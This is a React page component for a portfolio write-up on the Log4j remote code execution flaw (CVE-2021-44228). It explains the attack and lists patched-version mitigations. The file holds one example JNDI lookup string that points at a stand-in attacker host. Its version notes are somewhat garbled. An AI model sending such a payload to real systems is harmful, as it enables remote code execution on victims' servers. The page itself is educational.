import {
  Container,
  Badge,
  Link,
  List,
  ListItem,
  SimpleGrid,
  UnorderedList,
  Heading,
  Box,
  Center,
  useColorModeValue,
  Image
} from '@chakra-ui/react'
import Layout from '../../components/layouts/article'
import { ExternalLinkIcon } from '@chakra-ui/icons'
import { Title, WorkImage, Meta } from '../../components/work'
import P from '../../components/paragraph'

const Work = () => (
  <Layout title="amembo">
    <Container>
      <Title>
        Apache Log4j <Badge>2021</Badge>
      </Title>
      <Center my={6}>
        <Image src="/images/works/log4j_02.jpg" alt="icon" />
      </Center>
      <P>
       Apache Log4j is a Java-based logging utility, It is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j is one of several Java logging frameworks.
      <Heading as="h4" variant="section-title">Scenario:</Heading>
      </P>
      Attackers are actively exploiting a critical vulnerability that affects a Java logging package. log4j is used in a variety of different popular software by a number of manufacturers, including Apple, Twitter and Steam.
      Because of its large attack surface and the innate severity of remote code execution, security researchers are notably calling this a “shellshock” vulnerability. All threat actors need to trigger an attack is one line of text. There’s no obvious target for this vulnerability—hackers are taking a spray-and-pray approach to wreak havoc.
      <Heading as="h4" variant="section-title">How does this vulnerability works??</Heading>
      <P>
      The attack vector is extremely trivial for threat actors. A single string of text can trigger an application to reach out to an external location if it is logged via the vulnerable instance of log4j. 

A threat actor might supply special text in an HTTP User-Agent header or a simple POST form request, with the usual form:
      </P>
      <br></br>

      <Box
        borderRadius="lg"
        mb={6}
        p={3}
        textAlign="center"
        bg={useColorModeValue('whiteAlpha.400', 'whiteAlpha.400')}
      >
        $jndi:ldap://maliciousexternalhost.com/resource
      </Box>
      <P>
      where maliciousexternalhost.com is an instance controlled by the adversary. The log4j vulnerability parses this and reaches out to the malicious host via the “Java Naming and Directory Interface” (JNDI). The first-stage resource acts as a springboard to another attacker-controlled endpoint, which serves Java code to be executed on the original victim. 
      </P><br></br>
        <Image src="/images/works/log4j_01.jpg" alt="icon" />
      <P>Ultimately, this grants the adversary the opportunity to run any code they would like on the target: remote code execution. </P>

      <Heading as="h4" variant="section-title">Prevention:</Heading>
      <UnorderedList ml={4} my={4}>
      <ListItem> In version 2.12.2 Log4j disables access to JNDI by default. Usage of JNDI in configuration now need to be enabled explicitly. Calls to the JndiLookup will now return a constant string. Also, Log4j now limits the protocols by default to only java. The message lookups feature has been completely removed.</ListItem><br></br>

      <ListItem> In version 2.16.0 the message lookups feature has been completely removed. Lookups in configuration still work. Furthermore, Log4j now disables access to JNDI by default. JNDI lookups in configuration now need to be enabled explicitly. Also, Log4j now limits the protocols by default to only java, ldap, and ldaps and limits the ldap protocols to only accessing Java primitive objects. Hosts other than the local host need to be explicitly allowed.</ListItem>
      </UnorderedList>
      

      <List ml={4} my={4}>
        <ListItem>
          <Meta>Platform</Meta>
          <span>Cross-platform</span>
        </ListItem>
        <ListItem>
          <Meta>Written in</Meta>
          <span>Java</span>
        </ListItem>
        <ListItem>
          <Meta>CVE</Meta>
          <Link href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">
            CVE-2021-44228
          </Link>
        </ListItem>
        <ListItem>
          <Meta>Type</Meta>
          <span>Apache Logging</span>
        </ListItem>
        <ListItem>
          <Meta>Log4j XML</Meta>
          <Link href="https://gist.github.com/digitalsanctum/643774">Github-Gist of Log4j XML file</Link>
        </ListItem>
      </List>

      <Heading as="h4" fontSize={16} my={6}>
        <Center>POC (Proof of Concept)</Center>
      </Heading>

      <UnorderedList my={4}>
        <ListItem>
          <Link href="https://www.kb.cert.org/vuls/id/930724">
            <Badge mr={2}>JNDI Attack vector</Badge>
            JNDI「Java Naming and Directory Interface」{' '}
            <ExternalLinkIcon mx="2px" />
          </Link>
        </ListItem>
      </UnorderedList>


      <WorkImage src="/images/works/log4j_03.jpg" alt="amembo" />
      <WorkImage src="/images/works/log4j_04.jpg" alt="amembo" />
    </Container>
  </Layout>
)

export default Work
